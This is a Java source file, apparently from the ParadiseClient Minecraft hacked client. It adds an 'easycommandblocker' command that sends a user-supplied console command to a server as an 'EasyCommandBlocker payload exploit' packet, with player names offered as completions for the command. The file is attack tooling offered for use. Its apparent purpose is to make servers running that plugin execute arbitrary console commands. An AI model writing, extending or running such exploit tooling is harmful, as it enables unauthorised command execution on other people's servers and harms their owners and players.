package net.paradise_client.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import com.mojang.brigadier.suggestion.Suggestions;
import com.mojang.brigadier.suggestion.SuggestionsBuilder;
import net.paradise_client.command.Command;
import net.paradise_client.packet.EasyCommandBlockerPacket;
import net.paradise_client.Msg;
import net.minecraft.command.CommandSource;
import net.minecraft.client.MinecraftClient;

import java.util.Objects;
import java.util.concurrent.CompletableFuture;

import static net.minecraft.server.command.CommandManager.argument;

public class EasyCommandBlockerExploitCommand extends Command {

    private static final String PREFIX = "&7[&bParadiseClient&7] ";

    public EasyCommandBlockerExploitCommand() {
        super("easycommandblocker", "Sends EasyCommandBlocker payload to the server");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> root) {
        root
            .executes(this::executeRoot)
            .then(argument("consoleCommand", StringArgumentType.greedyString())
                .suggests(this::suggestUsernames)
                .executes(this::executeEasyCommandBlocker));
    }

    private CompletableFuture<Suggestions> suggestUsernames(CommandContext<CommandSource> context, SuggestionsBuilder builder) {
        String input = builder.getRemaining().toLowerCase();
        int lastSpaceIndex = input.lastIndexOf(' ');
        String prefix = lastSpaceIndex == -1 ? "" : input.substring(0, lastSpaceIndex + 1);
        String filter = (lastSpaceIndex == -1) ? input : input.substring(lastSpaceIndex + 1).toLowerCase();
        MinecraftClient client = MinecraftClient.getInstance();

        if (client.getNetworkHandler() != null) {
            client.getNetworkHandler().getPlayerList().stream()
                .map(entry -> entry.getProfile().getName())
                .filter(Objects::nonNull)
                .filter(name -> name.toLowerCase().startsWith(filter))
                .forEach(name -> builder.suggest(prefix + name));
        }

        return builder.buildFuture();
    }

    private int executeRoot(CommandContext<CommandSource> context) {
        Msg.sendFormattedMessage(PREFIX + "&cUsage: ,easycommandblocker <consoleCommand>");
        return 0;
    }

    private int executeEasyCommandBlocker(CommandContext<CommandSource> context) {
        String command = StringArgumentType.getString(context, "consoleCommand");
        Msg.sendFormattedMessage(PREFIX + "&aSending the &fEasyCommandBlocker &aPayload Exploit to the server...");
        EasyCommandBlockerPacket.send(command);
        return 0;
    }
}
